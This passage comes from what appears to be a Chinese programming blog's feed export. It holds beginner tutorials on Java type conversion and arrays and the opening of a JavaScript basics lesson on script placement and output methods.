（3）参与运算的两个数据如果类型不一样，会先把低级的数据转换成高级的类型的数据后再作运算，结果是高
     级的类型。
</font></td></tr></table>


<p>&emsp;<br>&emsp;</p>
<h4 id="3-3-隐含强制类型转换"><a href="#3-3-隐含强制类型转换" class="headerlink" title="3.3  隐含强制类型转换"></a><font color="#3CB371" face="Comic sans MS">3.3  隐含强制类型转换</font></h4><p><font face="Comic sans MS">Java中允许把int类型的常量赋给byte、short变量时不需要强制类型转换<br>      byte b=123;//合法<br>      short s=123;//合法<br>      b=b+3; //不合法<br>&emsp;<br>但是把int类型的变量赋给byte、short类型的变量时必须强制转换，否则会出错<br>     int i=123;<br>     byte b=i;  //正确的做法是byte b=(byte)i;<br>    byte a = 1; byte c = (byte)(a + b);<br></font></p>
<blockquote>
<blockquote>
<p>练习<br>设x,y,a分别为float,double,byte型变量，x=3.3,y=2.9,a=5, 则表达式x+ (int)y/ 3*a的值为多少？值的类型是什么？ </p>
</blockquote>
</blockquote>
<hr>
<hr>
<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数组(3.9)</title>
    <url>/post/Java-Language-2-4/</url>
    <content><![CDATA[<p>&ensp;<br>&ensp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>数组</font></center>

<p>&emsp;<br>&emsp;</p>
<h3 id="一、-一维数组"><a href="#一、-一维数组" class="headerlink" title="一、 一维数组 "></a><font color="#FF6347" face="Comic sans MS">一、 一维数组 </font></h3><p><font face="Comic sans MS"><font color="red"> <strong>数组：</strong> </font><font color="#00B2EE"><strong>相同类型的数据元素按顺序组成的一种线性表</strong></font>，元素在数组中的相对位置由下标来指定。数组中的每个元素通过数组名加下标进行引用。</p>
<p><font color="red"> <strong>数组有什么用处？</strong> </font><br><font color="#009ACD"><em>例：定义100个int型变量，求这100个变量的和。</em></font><br>int x1,x2,x3…x100;<br>int sum;<br>sum=x1+x2+…+x100;<br>这样程序很复杂。<br><font color="#009ACD"><em>例：定义100个int型变量，求这100个变量的和。</em></font><br>有了数组后，可以这样编程：<br>int [] x=new int[100];<br>int sum=0;<br>for(int i=0;i&lt;100;i++)<br>{<br>     sum=sum+x[i];<br>}<br>这样使得程序编写方便很多。</p>
<p><font color="red"> <strong>注意：</strong> </font><br>Java中，数组是独立的<font color="#00B2EE"><strong>类</strong></font>，有自身的方法，<font color="#00B2EE"><strong>不只是变量的集合</strong></font>。在Java里创建一个数组，需要做如下的工作：<br>   （1）说明一个变量来存放该数组。<br>   （2）<font color="#00B2EE"><strong>建立一个新的数组对象</strong></font>（即创建数组空间）并把它赋给这个数组变量。<br>   （3）在该数组中存储信息。<br></font></p>
<p>&emsp;&emsp;<font color="red"> <strong>↓↓</strong> </font></p>
<blockquote>
<p>例如：String list[ ]=new String[3];<br>             list[0]=“one”;<br>             list[1]=“two”;</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-1-一维数组的说明"><a href="#1-1-一维数组的说明" class="headerlink" title="1.1  一维数组的说明"></a><font color="#3CB371" face="Comic sans MS">1.1  一维数组的说明</font></h4><p><font face="Comic sans MS">同其他类变量一样，在使用数组前必须先说明它，一维数组说明的格式如下：<br><font color="red">&emsp;       类型    数组名[ ]；<br>    或 类型[ ]    数组名；<br></font></font></p>
<blockquote>
<p>例如：int list[ ];<br>            int[] list;<br>            String[] args;<br>            String args[];</p>
</blockquote>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-2-创建数组空间"><a href="#1-2-创建数组空间" class="headerlink" title="1.2  创建数组空间"></a><font color="#3CB371" face="Comic sans MS">1.2  创建数组空间</font></h4><p><font face="Comic sans MS">创建数组空间必须声明数组的长度，以确定所开辟的内存空间的大小，在Java中实际上就是通过new创建一个新的数组对象并把它赋给这个数组变量。其语法格式如下：<br><font color="red">&emsp;&emsp;&emsp;数组名=new 数组元素类型[数组元素个数]</font><br>例如：int[] list;   list=new int[3];</p>
<p>数组的说明和构造合并在一起，其语法格式如下：<br><font color="red">&emsp;&emsp;&emsp;          类型 数组名[ ]=new 数组元素类型[数组元素个数]；]</font><br>例如：int list[ ]=new int[3];<br></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-3-数组的初始化"><a href="#1-3-数组的初始化" class="headerlink" title="1.3  数组的初始化"></a><font color="#3CB371" face="Comic sans MS">1.3  数组的初始化</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 数组的初始化方式有两种：</strong></font><br>(1) 像初始化简单类型一样自动初始化数组，即在说明数组的同时进行初始化；<br>&emsp;&emsp;<font color="red">     int a[]={1,2,3,4}</font><br>(2) 先定义数组，然后为每个元素赋值。例如：<br>&emsp;&emsp;<font color="red">     int b[]=new int[3];</font><br>&emsp;&emsp;<font color="red">     b[0]=8;b[1]=9;</font><br>&emsp;<br><font color="red"><strong>2. 这样初始化也可以!</strong></font><br>另一种形式1：<br><font color="red">int[] a=new int[]{1,2,3,4};</font>&emsp;&emsp; 等价于: int[] a={1,2,3,4}<br>{}中的元素个数决定了[]中的元素个数。{}中的元素取值决定了数组a各个元素的取值。</p>
<p>另一种形式2：<br><font color="red">int[] a;<br>a=new int[]{1,2,3,4};</font><br>等价于：int[] a=new int[3];<br>&emsp;&emsp;&emsp;&emsp; a[0]=1;a[1]=2;a[2]=3;<br>&emsp;&emsp;&emsp;&emsp; a[3]=4<br></font></p>
<blockquote>
<p>但是这样定义是错误的：<br>int[] a;<br>a={1,2,3,4};</p>
</blockquote>
<p><font face="Comic sans MS"><font color="red"><strong>定义数组要注意：</strong></font><br>(1) 不能这样定义数组：<br>&emsp;&emsp;&emsp;&emsp;          int a[5];<br>(2)不能这样初始化数组：<br>&emsp;&emsp;&emsp;&emsp;          int[] a;   a={1,2,3,4};<br>(3)使用new 创建数组之后，数组中的每个元素被自动初始化为0。<br>&emsp;&emsp;&emsp;&emsp;         int [] a=new int[10];<br>&emsp;&emsp;&emsp;&emsp;         for(int i=0;i&lt;10;i++)<br>&emsp;&emsp;&emsp;&emsp;           { System.out.println(“a[“+i+”]=”+a[i]);<br>&emsp;&emsp;&emsp;&emsp;           }<br></font></p>
<p>&emsp;<br>&emsp;</p>
<h4 id="1-4-数组元素的使用"><a href="#1-4-数组元素的使用" class="headerlink" title="1.4  数组元素的使用"></a><font color="#3CB371" face="Comic sans MS">1.4  数组元素的使用</font></h4><p><font face="Comic sans MS">数组元素的表示方式为：<br>&emsp;&emsp;&emsp;&emsp; <font color="red">数组名[下标]</font><br>&emsp;<br><font color="red"><strong>使用数组时要注意：</strong></font><br>（1）数组越界异常:<font color="#00B2EE"><strong>Java在对数组元素操作时会对数组下标进行越界检查，以保证安全性。</strong></font>若在Java程序中超出了对数组下标的使用范围则在运行此程序时将出现如下错误信息：<br>&emsp;&emsp;    <em>Exception in thread “main”             Java.lang.ArrayIndexOutOfBoundsException</em><br>如下的错误即数组越界：int x[]={1,2,3,4};System.out.println(x[4]);</p>
<p>（2）每个数组都有一个属性length来指明其长度，字符串String用length()。<br>&emsp;&emsp;<font color="red">         <strong>list.length;</strong></font></p>
<p>（3）空指针异常<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">数组长度lengh的使用</span><br><span class="line"><span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;                  <span class="keyword">int</span> x[]=&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)              <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;x.length;i++)    </span><br><span class="line">&#123;  System.out.println(x[i]);        &#123; System.out.println(x[i]); </span><br><span class="line">&#125;                                   &#125;</span><br><span class="line"></span><br><span class="line">空指针如下使用会导致错误</span><br><span class="line"><span class="keyword">int</span> x[]=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">x=<span class="keyword">null</span>;</span><br><span class="line">x[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-5-一维数组使用举例"><a href="#1-5-一维数组使用举例" class="headerlink" title="1.5  一维数组使用举例"></a><font color="#3CB371" face="Comic sans MS">1.5  一维数组使用举例</font></h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-12] 练习数组的创建和使用</span><br><span class="line">[例3-13] 练习数组越界</span><br><span class="line">[例3-14] 数组作为函数的参数</span><br><span class="line"></span><br><span class="line">[例3-12] HalfDollars.java 练习数组的创建与使用</span><br><span class="line">class HalfDollars&#123;</span><br><span class="line">	public static void main(String[] args)&#123;</span><br><span class="line">		int[] denver=&#123;15000006,18810000,20752110&#125;;</span><br><span class="line">		int[] philadelphia=new int[denver.length];</span><br><span class="line">		int[] total=new int[denver.length];</span><br><span class="line">		int average;</span><br><span class="line">		</span><br><span class="line">		philadelphia[0]=15020000;</span><br><span class="line">		philadelphia[1]=18709000;</span><br><span class="line">		philadelphia[2]=21348000;</span><br><span class="line">		</span><br><span class="line">		total[0]=denver[0]+philadelphia[0];</span><br><span class="line">		total[1]=denver[1]+philadelphia[1];</span><br><span class="line">		total[2]=denver[2]+philadelphia[2];</span><br><span class="line">		average=(total[0]+total[1]+total[2])/3;</span><br><span class="line">		System.out.println(<span class="string">&quot;1993 production:&quot;</span>+total[0]);</span><br><span class="line">        System.out.println(<span class="string">&quot;1994 production:&quot;</span>+total[1]);</span><br><span class="line">        System.out.println(<span class="string">&quot;1995 production:&quot;</span>+total[2]);</span><br><span class="line">        System.out.println(<span class="string">&quot;Average production:&quot;</span>+average);</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br><span class="line">运行结果：</span><br><span class="line">1993 production:30020006</span><br><span class="line">1994 production:37519000</span><br><span class="line">1995 production:42100110</span><br><span class="line">Average production:36546372</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[例3-13] ChoiceSort.java 数组的越界</span><br><span class="line">public class ChoiceSort</span><br><span class="line">&#123;</span><br><span class="line">	public static void main(String arg[])</span><br><span class="line">     &#123;   int i,min;</span><br><span class="line">          int str[]=&#123;2,13,41,58,32&#125;;</span><br><span class="line">          <span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">          &#123;</span><br><span class="line">	         min=i;</span><br><span class="line">	        <span class="keyword">for</span>(int j=i+1;j&lt;6;j++)</span><br><span class="line">	         &#123;      </span><br><span class="line">	           <span class="keyword">if</span>(str[min]&gt;str[j])</span><br><span class="line">	         	 &#123;</span><br><span class="line">	              int at=str[j];</span><br><span class="line">	              str[j]=str[min];</span><br><span class="line">	              str[min]=at;</span><br><span class="line">	             &#125;</span><br><span class="line">	         &#125;  </span><br><span class="line">	      &#125;</span><br><span class="line">	    <span class="keyword">for</span>(i=0;i&lt;5;i++)</span><br><span class="line">	    System.out.println(str[i]+<span class="string">&quot; &quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">运行结果：</span><br><span class="line">程序没能正常运行，抛出了“java.lang.ArrayIndexOutOfBoundsException”异常。 </span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">例[3-14] test.java 数组作为函数的参数</span><br><span class="line">class <span class="built_in">test</span>  </span><br><span class="line">&#123;   static void change(int [] a)  //输出a[0]和a[1]中大的那个数</span><br><span class="line">    &#123;    int t;</span><br><span class="line">         <span class="keyword">if</span>(a[0]&lt;a[1])</span><br><span class="line">         &#123;        t=a[0];</span><br><span class="line">                  a[0]=a[1];</span><br><span class="line">                  a[1]=t;</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println(a[0]);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String args[])</span><br><span class="line">   &#123;    int x[]=&#123;5,12&#125;;</span><br><span class="line">        change(x);     //调用过后，数组x可能发生变化</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&emsp;<br>&emsp;</p>
<h3 id="二、-二维数组"><a href="#二、-二维数组" class="headerlink" title="二、 二维数组 "></a><font color="#FF6347" face="Comic sans MS">二、 二维数组 </font></h3><p><font face="Comic sans MS">Java中的多维数组实际上是数组的数组。不一定是规则的矩阵数组。<br><font color="red">多维数组：数组的数组，例如，二维数组为一个特殊的一维数组，其每个元素又是一个一维数组<br></font></font></p>
<p><img data-src="https://i.loli.net/2019/01/13/5c3ad27f549bb.png" alt="1.png"><img data-src="https://i.loli.net/2019/01/13/5c3ad282ed579.png" alt="2.png"></p>
<p>&emsp;<br>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>二维数组说明的格式为：</strong></font><br><font color="red">&emsp;  类型    数组名[ ][ ]；<br>      或                  类型[ ][ ]     数组名；<br></font><br>例如，说明一个整型的二维数组如下：<br><font color="red">&emsp;    int intArray[ ][ ];或 int[ ][ ] intArray;<br></font></p>
<p>&emsp;<br><font color="#00B2EE"><strong>二维数组的创建：</strong></font><br>直接为每一维分配空间，如：<br><font color="red">&emsp;       int a[ ][ ]=new int[2][3];</font><br></font></p>
<p>|||<br>:-: | :-: | :-:<br>a[0][0]|a[0][1]|a[0][2]<br>a[1][0]|a[1][1]|a[1][2]</p>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>从最高维开始，分别为每一维分配空间，如：</strong></font><br>int b[ ][ ]=new int[2][ ];<br>b[0]=new int[3];<br>b[1]=new int[5];<br></font></p>
<table>
<thead>
<tr>
<th align="center"></th>
<th align="center"></th>
<th align="center"></th>
</tr>
</thead>
<tbody><tr>
<td align="center">b[0][0]</td>
<td align="center">b[0][1]</td>
<td align="center">b[0][2]</td>
</tr>
<tr>
<td align="center">b[1][0]</td>
<td align="center">b[1][1]</td>
<td align="center">b[1][2]</td>
</tr>
</tbody></table>
<p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>元素的初始化：</strong></font><br>（1）直接对每个元素进行赋值。<br>（2）在说明数组的同时进行初始化。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例如：  int[][] a=new int[3][2]：</span><br><span class="line">              a[0][0]=2； a[0][1]=3</span><br><span class="line">              a[1][0]=1； a[1][1]=5</span><br><span class="line">              a[2][0]=3； a[2][1]=4  </span><br><span class="line">等价于：int a[ ][ ]=&#123;&#123;2,3&#125;,&#123;1,5&#125;,&#123;3,4&#125;&#125;; </span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>总结：与数组操作相关的系统函数</strong></font><br><font color="#00B2EE"><strong>（1）使用Arrays.sort来对数组排序</strong></font><br>int x[]=new int[]{3,2,1,4};<br>java.util.Arrays.sort(x);  //对数组x内的元素进行排序（升序）<br>for(int i=0;i &lt; x.length;i++)<br>{<br>      System.out.println(x[i]);<br>}</p>
<p><font color="#00B2EE"><strong>（2）使用Arrays.binarySearch函数对数组进行二分查找</strong></font><br>int [] x=new int[]{2,5,1,6,8,3};<br>java.util.Arrays.sort(x);<br>System.out.println(java.util.Arrays.binarySearch(x,1));   //二分查找，在数组x中查找1，输出0 ;如果没找到，则会输出一个&lt;0的数</p>
<p><font color="#00B2EE"><strong>（3）使用System.arraycopy函数拷贝数组</strong></font><br>int [] x;<br>x=new int[]{3,1,2,4};<br>int [] y;<br>y=new int[4];<br>System.arraycopy(x,0,y,0,4);<br>//将数组x内的 4个元素拷贝给数组y </p>
<p><font color="#00B2EE"><strong>（4）使用Ayyars.fill函数填充数组</strong></font><br>int [] x;<br>x=new int[]{3,1,2,4};<br>java.util.Arrays.fill(x,7);    //数组x中的4个元素都改为7<br></font></p>
<hr>
<hr>
<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript</title>
    <url>/post/JavaScript/</url>
    <content><![CDATA[<p>JavaScript 语句和 JavaScript 变量都对大小写敏感。( ⸝⸝•ᴗ•⸝⸝ )੭⁾⁾</p>
<a id="more"></a>


<br />

<br />

<center><font color="#00B2EE" face="Comic sans MS" size=5>JavaScript 基础</font> </center>



<br />

<br />

<h3 id="一-JavaScript-简介"><a href="#一-JavaScript-简介" class="headerlink" title="一. JavaScript 简介"></a><font color="#FF6347" face="Comic sans MS">一. JavaScript 简介</font></h3><br />

<h4 id="1-1-JavaScript-由来"><a href="#1-1-JavaScript-由来" class="headerlink" title="1.1 JavaScript 由来"></a><font color="#3CB371" face="Comic sans MS">1.1 JavaScript 由来</font></h4><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（1） 关于JavaScript</strong></font></p>
<p>在上个世纪的1995年，当时的网景公司正凭借其Navigator浏览器成为Web时代开启时最著名的第一代互联网公司。</p>
<p>由于网景公司希望能在静态HTML页面上添加一些动态效果，于是叫Brendan Eich这哥们在两周之内设计出了JavaScript语言。你没看错，这哥们只用了10天时间。</p>
<p>为什么起名叫JavaScript？原因是当时Java语言非常红火，所以网景公司希望借Java的名气来推广，但事实上JavaScript除了语法上有点像Java，其他部分基本上没啥关系。</p>
<br />

<p><strong>ECMAScript</strong></p>
<p>因为网景开发了JavaScript，一年后微软又模仿JavaScript开发了JScript，为了让JavaScript成为全球标准，几个公司联合ECMA（European Computer Manufacturers Association）组织定制了JavaScript语言的标准，被称为ECMAScript标准。</p>
<p>所以简单说来就是，ECMAScript是一种语言标准，而JavaScript是网景公司对ECMAScript标准的一种实现。</p>
<p>那为什么不直接把JavaScript定为标准呢？因为JavaScript是网景的注册商标。</p>
<p>不过大多数时候，我们还是用JavaScript这个词。如果你遇到ECMAScript这个词，简单把它替换为JavaScript就行了。</p>
<br />

<p><strong>JavaScript版本</strong></p>
<p>JavaScript语言是在10天时间内设计出来的，虽然语言的设计者水平非常NB，但谁也架不住“时间紧，任务重”，所以，JavaScript有很多设计缺陷，我们后面会慢慢讲到。</p>
<p>此外，由于JavaScript的标准——ECMAScript在不断发展，最新版ECMAScript 6标准（简称ES6）已经在2015年6月正式发布了，所以，讲到JavaScript的版本，实际上就是说它实现了ECMAScript标准的哪个版本。</p>
<p>由于浏览器在发布时就确定了JavaScript的版本，加上很多用户还在使用IE6这种古老的浏览器，这就导致你在写JavaScript的时候，要照顾一下老用户，不能一上来就用最新的ES6标准写，否则，老用户的浏览器是无法运行新版本的JavaScript代码的。</p>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（2） JavaScript是什么？</strong></font></p>
<ul>
<li><p>JavaScript是一种小型的、轻量级的、面向对象的、跨平台的客户端脚本语言。</p>
</li>
<li><p>JavaScript是嵌入到浏览器软件当中的去的，只要你的电脑有浏览器就可以执行JS程序了。JavaScript是一种面向对象的程序语言。在程序中，对象是由“属性”和“方法”构成。</p>
</li>
<li><p><strong>跨平台：</strong>JS程序可以在多种平台下运行，如：windows、linux、mac、IOS等。</p>
</li>
<li><p><strong>客户端脚本程序：</strong>JS只能在客户端的浏览器来运行，不能在服务器端来运行。</p>
</li>
<li><p><strong>浏览器是一个翻译器</strong>，可以翻译三种代码：HTML代码、CSS代码、JavaScript代码。</p>
</li>
<li><p>JavaScript 是可插入 HTML 页面的编程代码。</p>
</li>
</ul>
<p><strong>注：JS中的对象只要会用就可以了，不需要我们自己去开发对象。</strong></p>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（3） JavaScript能干什么？</strong></font></p>
<ul>
<li><p><strong>表单验证：</strong>是JS最基本的功能。</p>
</li>
<li><p><strong>动态HTML：</strong>可以实现一些动态的、重复的效果。</p>
</li>
<li><p><strong>交互式：</strong>人机交互，通过键盘或鼠标，与网页中的元素进行交互。</p>
</li>
</ul>
<br />

<br />

<h4 id="1-2-JavaScript-规则"><a href="#1-2-JavaScript-规则" class="headerlink" title="1.2 JavaScript 规则"></a><font color="#3CB371" face="Comic sans MS">1.2 JavaScript 规则</font></h4><p><font face="Microsoft YaHei" color="#FF7F00"><strong>（1） JavaScript用法</strong></font></p>
<ul>
<li><p>同一个网页中，可以有HTML代码、CSS代码、JavaScript代码。</p>
</li>
<li><p>通过**<code>&lt;script&gt;&lt;/script&gt;</code>**来引入JS程序代码。即HTML 中的脚本必须位于 <code>&lt;script&gt;</code> 与 <code>&lt;/script&gt;</code> 标签之间。<code>&lt;script&gt;</code> 和 <code>&lt;/script&gt;</code> 会告诉 JavaScript 在何处开始和结束。</p>
</li>
</ul>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（2） 脚本的放置位置</strong></font></p>
<p>脚本可被放置在：</p>
<ol>
<li>放在HTML页面的<code>&lt;head&gt;&lt;/head&gt;</code> 里；</li>
<li>放在HTML页面的 <code>&lt;body&gt;&lt;/body&gt;</code> 里；或者同时放在二者中；</li>
<li>放在外部 .js文件里，这个文件里面直接写js脚本，不用再写<code>&lt;script&gt;&lt;/script&gt;</code>这两个标签。</li>
</ol>
<br />

<p><strong>a. 把 JavaScript 代码放在<code>&lt;head&gt;&lt;/head&gt;</code> 和放在 <code>&lt;body&gt;&lt;/body&gt;</code> 里的区别：</strong></p>
<ul>
<li>简单地说，放在 <code>&lt;head&gt;&lt;/head&gt;</code> 里的会比放在 <code>&lt;body&gt;&lt;/body&gt;</code> 先执行。head 标签里的代码会在页面还未开始绘制之前被解析，而在 body 里的代码则会在页面渲染的同时在读取到这段代码的时候才被执行。</li>
<li>通常的做法是把函数放入 <code>&lt;head&gt;</code> 部分中，或者放在页面底部。这样就可以把它们安置到同一处位置，不会干扰页面的内容。</li>
</ul>
<br />

<p><strong>b. 外部的 JavaScript</strong></p>
<ul>
<li>也可以把脚本保存到外部文件中。外部文件通常包含被多个网页使用的代码。</li>
<li>外部 JavaScript 文件的文件扩展名是 .js。</li>
<li>如需使用外部文件，请在 <code>&lt;script&gt;</code> 标签的 “src” 属性中设置该 .js 文件：</li>
<li>可以将脚本放置于 <code>&lt;head&gt;</code> 或者 <code>&lt;body&gt;</code>中，放在 <code>&lt;script&gt;</code> 标签中的脚本与外部引用的脚本运行效果完全一致。</li>
</ul>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;myScript.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>说明：</strong>那些老旧的实例可能会在 <code>&lt;script&gt;</code> 标签中使用 <code>type=&quot;text/javascript&quot;</code>。现在已经不必这样做了。JavaScript 是所有现代浏览器以及 HTML5 中的默认脚本语言。</p>
</blockquote>
<br />

<p><font face="Microsoft YaHei" color="#FF7F00"><strong>（3） 关于注释</strong></font></p>
<ol>
<li><p>C/C++/C#/Java/JavaScript：单行使用**<code>//</code><strong>,多行使用</strong><code>/*...*/</code>**</p>
</li>
<li><p>MYSQL/Python：**<code>#</code>**</p>
</li>
<li><p>PHP：单行使用**<code>//</code>**，多行使用三对单引号或者双引号</p>
</li>
<li><p>CSS：**<code>/*...*/</code>**</p>
</li>
<li><p>HTML：**<code>&lt;!--注释内容--&gt;</code>**</p>
</li>
</ol>
<br />

<br />

<h4 id="1-3-JavaScript-输出"><a href="#1-3-JavaScript-输出" class="headerlink" title="1.3 JavaScript 输出"></a><font color="#3CB371" face="Comic sans MS">1.3 JavaScript 输出</font></h4><blockquote>
<p><font color="#FF7F00"><strong>JavaScript 显示数据</strong></font></p>
</blockquote>
<ol>
<li>使用 window.alert() 弹出警告框。</li>
<li>使用 document.write() 方法将内容写到 HTML 文档中。</li>
<li>使用 innerHTML 写入到 HTML 元素。</li>
<li>使用 console.log() 写入到浏览器的控制台。</li>
</ol>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（1） window.alert(str) 弹出警告框</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font>在当前窗口中弹出一个警告对话框，str为对话框中显示的内容。<br>window：代表当前浏览器窗口，window是一个窗口对象。<br>alert()：弹出一个对话框。<br>str：表示要输出的内容。</p>
</blockquote>
<br />

<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;来试一波&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c877dd02cfeb.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;我的第一个页面&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert(<span class="number">5</span> + <span class="number">6</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c877e7a8a039.png" alt="1.png"></p>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（2） document.write(str) 写到 HTML 文档</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font></p>
</blockquote>
<ol>
<li>document意思“文档”，就是整个网页了。</li>
<li>document是一个文档对象，代表整个网页。</li>
<li>write()是document对象的一个输出方法。</li>
<li>“.”小数点：通过小数点(.)来调用对象的方法。</li>
<li>str：表示要输出的内容。</li>
</ol>
<p><strong>注意事项：</strong></p>
<ol>
<li>请使用 document.write() 仅仅向文档输出写内容。</li>
<li>如果在文档已完成加载后执行 document.write，整个 HTML 页面将被覆盖。</li>
</ol>
<br />

<p>下面实例说明document.write()在文档加载完后执行将会覆盖之前的页面：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;点击“点我”前的页面&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;这是“点我”前的页面Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;button onclick=<span class="string">&quot;myFunction()&quot;</span>&gt;点我&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    document.write(Date());</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<p>在没有点击“点我”前的页面：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c8785a1aca7f.png" alt="3.png"></p>
<p><br />在点击“点我”后的页面：</p>
<p><img data-src="https://i.loli.net/2019/03/12/5c8785a5c3ea4.png" alt="4.png"></p>
<br />

<p><font face="Microsoft YaHei" color="#00B2EE"><strong>（3） innerHTML 操作 HTML 元素</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>描述：</strong></font></p>
</blockquote>
<ol>
<li>innerHTML用于操作 HTML 元素。</li>
<li>如需从 JavaScript 访问某个 HTML 元素，您可以使用 document.getElementById(id) 方法。</li>
<li>请使用 “id” 属性来标识 HTML 元素，并 innerHTML 来获取或插入元素内容：</li>
</ol>
<p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt; </span><br><span class="line">&lt;title&gt;再来试一波&lt;/title&gt; </span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body background=<span class="string">&quot;https://i.loli.net/2019/03/12/5c8780490c44e.jpg&quot;</span>&gt;</span><br><span class="line">	</span><br><span class="line">&lt;h1&gt;我的第一个 Web 页面&lt;/h1&gt;</span><br><span class="line">&lt;p id=<span class="string">&quot;demo&quot;</span>&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(<span class="string">&quot;demo&quot;</span>).innerHTML=<span class="string">&quot;段落已修改。&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">	</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2019/03/12/5c87808ae6e21.png" alt="2.png"></p>
<p><strong>说明：</strong>以上 JavaScript 语句（在 <code>&lt;script&gt;</code> 标签中）可以在 web 浏览器中执行：</p>
<ol>
<li><strong><code>document.getElementById(&quot;demo&quot;)</code> ：</strong>是使用 <code>id</code> 属性来查找 HTML 元素的 JavaScript 代码 。</li>
